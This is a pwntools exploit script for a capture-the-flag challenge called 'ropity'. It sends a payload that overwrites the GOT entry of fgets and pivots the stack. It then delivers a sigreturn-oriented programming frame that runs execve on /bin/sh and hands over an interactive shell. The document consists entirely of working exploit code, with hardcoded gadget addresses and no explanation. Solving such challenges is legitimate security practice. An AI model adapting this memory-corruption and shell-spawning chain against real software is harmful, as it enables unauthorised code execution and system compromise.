#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("ropity.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    payload = b""
    payload += p64(exe.got['fgets']-0x10)
    payload += p64(exe.sym['main']+12)
        
    io.sendline(B"A" * 0x8 + payload)

    import time
    time.sleep(1)
    input('continue')

    # 0x0000000040101a: ret;
    # 0x0000000040111d: pop rbp; ret;
    # 0x0000000040115b: leave; ret; 
    ret = p64(0x0000000040101a)
    leave_ret = p64(0x0000000040115b)
    pop_rbp = p64(0x0000000040111d)
    syscall = p64(0x0000000000401198)

    frame1 = SigreturnFrame()
    frame1.rsp = 0x404030
    frame1.rax = 0x3b
    frame1.rdi = 0x404068
    frame1.rsi = 0
    frame1.rdx = 0
    frame1.rip = u64(syscall)
    frame1.r10 = u64(b"/bin/sh\x00")
    print(len(bytes(frame1)))
    
    io.sendline(
        p64(0x4141) + p64(0xf + 8) + \
        p64(exe.sym['main']+19) + \
        # got
        pop_rbp + \
        p64(0x6969) + syscall + bytes(frame1))
    
    io.interactive()    


if __name__ == "__main__":
    main()
